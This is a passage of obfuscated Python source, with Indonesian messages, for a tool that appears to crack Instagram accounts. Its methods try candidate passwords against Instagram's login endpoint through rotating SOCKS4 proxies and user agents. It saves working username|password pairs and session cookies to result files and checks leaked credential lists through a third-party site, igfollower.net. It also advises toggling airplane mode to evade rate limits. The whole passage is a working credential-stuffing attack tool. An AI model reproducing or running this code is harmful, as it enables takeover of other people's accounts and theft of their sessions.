            print (f"{K}[{P}>{K}]{P} Mengikuti : {qwe}")
            self .die .append (f'{username}|{z}')
            with open ('Results/Cp.txt','a')as wr :
              wr .write (f'{username}|{z}')
            break 
          elif 'Please wait'in str (req .text ):
            print (f"{P}[{M}!{P}]{M} Hidupkan Mode Pesawat 2 Detik...",end ='r');time .sleep (10 );self .__fast__ (wc ,username ,x )
          else :
            continue 
      self .looping +=1 
      print (f"{T}[{P}Crack{T}]{P} {str(len(wc))}/{self.looping} Cp-:-{len(self.die)} Ok-:-{len(self.live)}         ",end ='r')
    except (ConnectionError ):
      print (f"{P}[{U}!{P}]{U} Koneksi Error                     ",end ='r');time .sleep (5 );self .__fast__ (wc ,username ,x )
    except :self .__fast__ (wc ,username ,x )
  def __slow__ (OO00OOOOOOO00O000 ,OO00O00O00OOO0O00 ,OO0OO0O0OO0OO000O ,O0OO0O0OOOO0OO0OO ):
    try :
      for O000O000O000000OO in O0OO0O0OOOO0OO0OO :
        O000O000O000000OO =O000O000O000000OO .lower ()
        O0O0OO0OO0OO0O00O =requests .get ('https://www.instagram.com').cookies .get_dict ()['csrftoken']
        O0O0000O0O0OO0O0O ={'Host':'www.instagram.com','content-length':'388','x-ig-www-claim':'0','x-instagram-ajax':'a7173192e516','content-type':'application/x-www-form-urlencoded','accept':'*/*','x-requested-with':'XMLHttpRequest','x-asbd-id':'198387','user-agent':random .choice (open ("Data/useragent.txt","r").read ().splitlines ()),'x-csrftoken':O0O0OO0OO0OO0O00O ,'x-ig-app-id':'1217981644879628','origin':'https://www.instagram.com','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://www.instagram.com/','accept-encoding':'gzip, deflate','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
        O0O0OOO000000O0O0 ={'csrftoken':O0O0OO0OO0OO0O00O }
        O00O0O000000O0O00 ={'enc_password':f'#PWD_INSTAGRAM_BROWSER:0:{random.randint(0000000000,9999999999)}:{O000O000O000000OO}','username':OO0OO0O0OO0OO000O ,'queryParams':{},'optIntoOneTap':False ,'stopDeletionNonce':'','trustedDeviceRecords':{}}
        OO000000000O0OOO0 ={'http':'socks4://%s'%(random .choice (open ("Data/proxies.txt","r").read ().splitlines ()))}
        with requests .Session ()as OOOOO0OOOOO00O0O0 :
          O0OOOOO0O0O00000O =OOOOO0OOOOO00O0O0 .post ('https://www.instagram.com/accounts/login/ajax/',data =O00O0O000000O0O00 ,headers =O0O0000O0O0OO0O0O ,proxies =OO000000000O0OOO0 ,allow_redirects =True )
          if 'userId'in str (O0OOOOO0O0O00000O .text ):
            try :
              OOOOOOO0O000OOO00 ='mid=Yiyh-wAEAAFn4bazVHutqTIvwKkM; '
              O0OO000O00O000000 ="; ".join ([str (OOOOO0OOOOOOO0O00 )+"="+str (O0OOOO000O00OOOO0 )for OOOOO0OOOOOOO0O00 ,O0OOOO000O00OOOO0 in O0OOOOO0O0O00000O .cookies .get_dict ().items ()])
              O000O00OOOO0OOOOO =requests .get (f'https://www.instagram.com/{OO0OO0O0OO0OO000O}/?__a=1',headers ={'user-agent':useragent ,'cookie':open ('Data/cookie.txt','r').read ()}).json ()['graphql']['user']
              OO0O00000O00OOO0O =(O000O00OOOO0OOOOO ['edge_followed_by']['count'])
              OO0O00O0O000O00O0 =(O000O00OOOO0OOOOO ['edge_follow']['count'])
            except (IOError ,KeyError ,ConnectionError ):
              OO0O00000O00OOO0O =('-')
              OO0O00O0O000O00O0 =('-')
            except :pass 
            print (f"r{H}[{P}xe2x9cx94{H}]{P} Status : Success          ")
            print (f"{H}[{P}>{H}]{P} Username : {OO0OO0O0OO0OO000O}")
            print (f"{H}[{P}>{H}]{P} Password : {O000O000O000000OO}")
            print (f"{H}[{P}>{H}]{P} Pengikut : {OO0O00000O00OOO0O}")
            print (f"{H}[{P}>{H}]{P} Mengikuti : {OO0O00O0O000O00O0}")
            print (f"{H}[{P}>{H}]{P} Cookies : {OOOOOOO0O000OOO00}{O0OO000O00O000000}")
            OO00OOOOOOO00O000 .live .append (f'{OO0OO0O0OO0OO000O}|{O000O000O000000OO}')
            with open ('Results/Ok.txt','a')as OO00OOOO0000OO0OO :
              OO00OOOO0000OO0OO .write (f'{OO0OO0O0OO0OO000O}|{O000O000O000000OO}')
            break 
          elif 'checkpoint_required'in str (O0OOOOO0O0O00000O .text ):
            try :
              O000O00OOOO0OOOOO =requests .get (f'https://www.instagram.com/{OO0OO0O0OO0OO000O}/?__a=1',headers ={'user-agent':useragent ,'cookie':open ('Data/cookie.txt','r').read ()}).json ()['graphql']['user']
              OO0O00000O00OOO0O =(O000O00OOOO0OOOOO ['edge_followed_by']['count'])
              OO0O00O0O000O00O0 =(O000O00OOOO0OOOOO ['edge_follow']['count'])
            except (IOError ,KeyError ,ConnectionError ):
              OO0O00000O00OOO0O =('-')
              OO0O00O0O000O00O0 =('-')
            except :pass 
            print (f"r{K}[{P}xe2x9cx98{K}]{P} Status : Chekpoint          ")
            print (f"{K}[{P}>{K}]{P} Username : {OO0OO0O0OO0OO000O}")
            print (f"{K}[{P}>{K}]{P} Password : {O000O000O000000OO}")
            print (f"{K}[{P}>{K}]{P} Pengikut : {OO0O00000O00OOO0O}")
            print (f"{K}[{P}>{K}]{P} Mengikuti : {OO0O00O0O000O00O0}")
            OO00OOOOOOO00O000 .die .append (f'{OO0OO0O0OO0OO000O}|{O000O000O000000OO}')
            with open ('Results/Cp.txt','a')as OO00OOOO0000OO0OO :
              OO00OOOO0000OO0OO .write (f'{OO0OO0O0OO0OO000O}|{O000O000O000000OO}')
            break 
          elif 'Please wait'in str (O0OOOOO0O0O00000O .text ):
            print (f"{P}[{M}!{P}]{M} Hidupkan Mode Pesawat 2 Detik...",end ='r');time .sleep (10 );OO00OOOOOOO00O000 .__slow__ (OO00O00O00OOO0O00 ,OO0OO0O0OO0OO000O ,O0OO0O0OOOO0OO0OO )
          else :
            continue 
      OO00OOOOOOO00O000 .looping +=1 
      print (f"{T}[{P}Crack{T}]{P} {str(len(OO00O00O00OOO0O00))}/{OO00OOOOOOO00O000.looping} Cp-:-{len(OO00OOOOOOO00O000.die)} Ok-:-{len(OO00OOOOOOO00O000.live)}         ",end ='r')
    except (ConnectionError ):
      print (f"{P}[{U}!{P}]{U} Koneksi Error                     ",end ='r');time .sleep (5 );OO00OOOOOOO00O000 .__slow__ (OO00O00O00OOO0O00 ,OO0OO0O0OO0OO000O ,O0OO0O0OOOO0OO0OO )
    except :OO00OOOOOOO00O000 .__slow__ (OO00O00O00OOO0O00 ,OO0OO0O0OO0OO000O ,O0OO0O0OOOO0OO0OO )
class __crack__ :
  def __init__ (O00000OOOOO0O0OO0 ):
    O00000OOOOO0O0OO0 .looping =0 
    O00000OOOOO0O0OO0 .live =[]
    O00000OOOOO0O0OO0 .die =[]
    try :
      O00000OOOOO0O0OO0 .file =input (f"""
{B}[{P}*{B}]{P} Contoh : Results/Cp.txt
{B}[{P}?{B}]{P} File : """)
      if len (O00000OOOOO0O0OO0 .file )==0 :
        exit (f"{P}[{M}!{P}]{M} Jangan Kosong")
      else :
        O00000OOOOO0O0OO0 .split =input (f"{B}[{P}?{B}]{P} Pemisah : ");print (" ")
        if len (O00000OOOOO0O0OO0 .split )==0 :
          exit (f"{P}[{M}!{P}]{M} Jangan Kosong")
        else :
          O00000OOOOO0O0OO0 .list =open (O00000OOOOO0O0OO0 .file ,'r').read ().splitlines ()
          if len (O00000OOOOO0O0OO0 .list )==0 :
            exit (f"{P}[{M}!{P}]{M} File Kosong")
          for OO0O00O0000OOOOO0 in O00000OOOOO0O0OO0 .list :
            OOOOO00OOOOO0O000 =OO0O00O0000OOOOO0 .split (O00000OOOOO0O0OO0 .split )[0 ]
            OOO00OOO0000O0OO0 =OO0O00O0000OOOOO0 .split (O00000OOOOO0O0OO0 .split )[1 ]
            O00000OOOOO0O0OO0 .__main__ (O00000OOOOO0O0OO0 .list ,OOOOO00OOOOO0O000 ,OOO00OOO0000O0OO0 )
          exit (f"{H}[{P}Selesai{H}]{P}")
    except (IOError ):
      exit (f"{P}[{M}!{P}]{M} File Tidak Ada")
    except Exception as O0000O0OO00000O00 :
      exit (f"{P}[{M}!{P}]{M} {O0000O0OO00000O00}")
  def __main__ (O0O00O0O00000O000 ,OOOO0O0OOO00OOO00 ,OOO00OOO0OOOOO0OO ,OOO0OO00000000OO0 ):
    try :
      print (f"{T}[{P}Crack{T}]{P} {str(len(OOOO0O0OOO00OOO00))}/{O0O00O0O00000O000.looping} Cp-:-{len(O0O00O0O00000O000.die)} Ok-:-{len(O0O00O0O00000O000.live)}     ",end ='r')
      OO0000O0OO0OOOO00 ={'Host':'igfollower.net','content-length':'93','accept':'application/json, text/javascript, */*; q=0.01','x-requested-with':'XMLHttpRequest','user-agent':random .choice (open ("Data/useragent.txt","r").read ().splitlines ()),'content-type':'application/x-www-form-urlencoded; charset=UTF-8','origin':'https://igfollower.net','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://igfollower.net/girisyap','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
      O0OOO0O0OO0O00OO0 ={'username':OOO00OOO0OOOOO0OO ,'password':OOO0OO00000000OO0 ,'userid':''}
      O0OO00O00OOO0000O ={'http':'socks4://%s'%(random .choice (open ("Data/proxies.txt","r").read ().splitlines ()))}
      with requests .Session ()as OO0OO000O0O00000O :
        OO00OO00O0OOOOOOO =OO0OO000O0O00000O .post ('https://igfollower.net/girisyap?',data =O0OOO0O0OO0O00OO0 ,headers =OO0000O0OO0OOOO00 ,proxies =O0OO00O00OOO0000O ,timeout =None )
        if 'success'in str (OO00OO00O0OOOOOOO .json ()):
          O0O00O0O00000O000 .looping +=1 
          print (f"r{H}[{P}Ok{H}]{P} {OOO00OOO0OOOOO0OO}|{OOO0OO00000000OO0}     ")
          O0O00O0O00000O000 .live .append (f'{OOO00OOO0OOOOO0OO}|{OOO0OO00000000OO0}')
        elif 'checkpoint'in str (OO00OO00O0OOOOOOO .json ()):
          O0O00O0O00000O000 .looping +=1 
          print (f"r{K}[{P}Cp{K}]{P} {OOO00OOO0OOOOO0OO}|{OOO0OO00000000OO0}     ")
          O0O00O0O00000O000 .die .append (f'{OOO00OOO0OOOOO0OO}|{OOO0OO00000000OO0}')
        else :
          O0O00O0O00000O000 .looping +=1 
    except (ConnectionError ):
      print (f"{P}[{U}!{P}]{U} Koneksi Error               ",end ='r');time .sleep (8 );O0O00O0O00000O000 .__main__ (OOOO0O0OOO00OOO00 ,OOO00OOO0OOOOO0OO ,OOO0OO00000000OO0 )
    except :O0O00O0O00000O000 .__main__ (OOOO0O0OOO00OOO00 ,OOO00OOO0OOOOO0OO ,OOO0OO00000000OO0 )
def __masuk__ ():
  try :
    O000000OO0OOO000O =open ('Data/apikey.txt','r').read ()
  except (IOError ):
    __apikey__ ()
  else :
    __menu__ ()

if __name__=="__main__":
    __menu__ ()
